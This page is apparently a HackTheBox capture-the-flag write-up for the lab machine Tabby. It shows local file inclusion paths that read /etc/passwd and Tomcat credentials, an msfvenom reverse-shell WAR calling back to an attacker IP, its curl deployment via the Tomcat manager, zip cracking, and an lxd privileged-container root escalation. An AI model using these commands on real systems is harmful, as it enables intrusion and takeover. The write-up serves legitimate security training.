@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/tabby.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Tabby - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Tabby</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Tabby</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">lfi via news.php</span>
+                    <span class="tag">tomcat-users.xml leak</span>
+                    <span class="tag">tomcat manager war deploy</span>
+                    <span class="tag">zip password crack</span>
+                    <span class="tag">lxd group privesc</span>
+                </div>
+
+                <img src="../../images/hackthebox/tabby/index.png" alt="Tabby Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. Three ports: SSH, a plain Apache on 80, and Apache Tomcat on 8080.</p>
+
+                <pre><code>[Tabby] nmap -Pn -sSVC -p- -T5 --min-rate 2000 -oN nmap 10.129.27.193
+Nmap scan report for 10.129.27.193
+Host is up (0.22s latency).
+Not shown: 65074 closed tcp ports (reset), 458 filtered tcp ports (no-response)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>The site on port 80 is a hosting company called "Mega Hosting". One of the links points at <code>megahosting.htb</code>, so I added it to <code>/etc/hosts</code>. Browsing the site, the news article link loads content through a <code>file</code> parameter:</p>
+
+                <pre><code>http://megahosting.htb/news.php?file=statement</code></pre>
+
+                <p>A <code>file=</code> parameter that pulls a page off disk is the classic local file inclusion smell. Traversing out of the web root confirms it reads arbitrary files:</p>
+
+                <pre><code>http://megahosting.htb/news.php?file=../../.././../../../etc/passwd</code></pre>
+
+                <h2>Exploitation</h2>
+
+                <p>Port 8080 is Tomcat, and Tomcat keeps its manager credentials in <code>tomcat-users.xml</code>. On an Ubuntu package install that file lives under <code>/usr/share/tomcat9/etc/</code>, so I pointed the LFI straight at it:</p>
+
+                <pre><code>http://megahosting.htb/news.php?file=../../../../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml</code></pre>
+
+                <p>The file comes back with a manager account defined:</p>
+
+                <pre><code>&lt;user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/&gt;</code></pre>
+
+                <p>The <code>manager-script</code> role is the one that matters. It grants access to the text-based manager app at <code>/manager/text</code>, which lets you deploy a WAR with a single authenticated request, no GUI CSRF token needed. I built a reverse-shell WAR with <code>msfvenom</code>:</p>
+
+                <pre><code>[Tabby] msfvenom -p java/shell_reverse_tcp lhost=10.10.15.221 lport=4444 -f war -o pwn.war</code></pre>
+
+                <p>Start a listener, then upload and deploy the WAR under the path <code>/foo</code>. Requesting that path fires the payload:</p>
+
+                <pre><code>[Tabby] curl -v -u tomcat:'$3cureP4s5w0rd123!' --upload-file pwn.war 'http://10.129.27.193:8080/manager/text/deploy?path=/foo&amp;update=true'
+[Tabby] curl http://10.129.27.193:8080/foo</code></pre>
+
+                <pre><code>[Tabby] nc -lnvp 4444
+Connection received on 10.129.27.193
+id
+uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>Foothold as <code>tomcat</code>. Back in the web root there is a password-protected backup archive sitting next to the site files:</p>
+
+                <pre><code>tomcat@tabby:~$ ls /var/www/html/files/
+16162020_backup.zip</code></pre>
+
+                <p>I pulled it back to my box and ran <code>zip2john</code> to turn the archive into a crackable hash, then let <code>john</code> loose on it with <code>rockyou</code>:</p>
+
+                <pre><code>[Tabby] zip2john 16162020_backup.zip > hash
+[Tabby] john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+admin@it         (16162020_backup.zip)
+1g 0:00:00:00 DONE (2025-12-29 20:16) 1.639g/s ...
+Session completed</code></pre>
+
+                <p>The archive password is <code>admin@it</code>. There is a regular user <code>ash</code> on the box, and the same string works as her system password, so this is a straight <code>su</code> to the user flag:</p>
+
+                <pre><code>tomcat@tabby:~$ su ash
+Password: admin@it
+ash@tabby:~$ id
+uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+ash@tabby:~$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>The group list from <code>id</code> gives the escalation away: <code>ash</code> is in the <strong>lxd</strong> group. Membership in <code>lxd</code> is effectively root, because you can drive the container manager to mount the host filesystem read-write inside a privileged container that you fully control.</p>
+
+                <p>LXD needs a container image to launch. I built a minimal Alpine image on my own machine with <a href="https://github.com/saghul/lxd-alpine-builder">saghul/lxd-alpine-builder</a>, transferred the resulting tarball to the target, and imported it:</p>
+
+                <pre><code>ash@tabby:~$ /snap/bin/lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b</code></pre>
+
+                <p>With the image in place, create a storage pool and a profile, then launch a container with <code>security.privileged=true</code> and the host root disk bind-mounted inside it:</p>
+
+                <pre><code>ash@tabby:~$ /snap/bin/lxc storage create default dir
+Storage pool default created
+ash@tabby:~$ /snap/bin/lxc profile device add default root disk path=/ pool=default
+Device root added to default
+ash@tabby:~$ /snap/bin/lxc init myimage ignite -c security.privileged=true
+Creating ignite
+ash@tabby:~$ /snap/bin/lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+ash@tabby:~$ /snap/bin/lxc start ignite
+ash@tabby:~$ /snap/bin/lxc exec ignite /bin/sh</code></pre>
+
+                <p>Inside the privileged container the host filesystem is mounted at <code>/mnt/root</code> and, because the container runs as real root against the host, everything under it is fully readable. From there it is just reading the root flag:</p>
+
+                <pre><code># cat /mnt/root/root/root.txt</code></pre>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Tabby</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
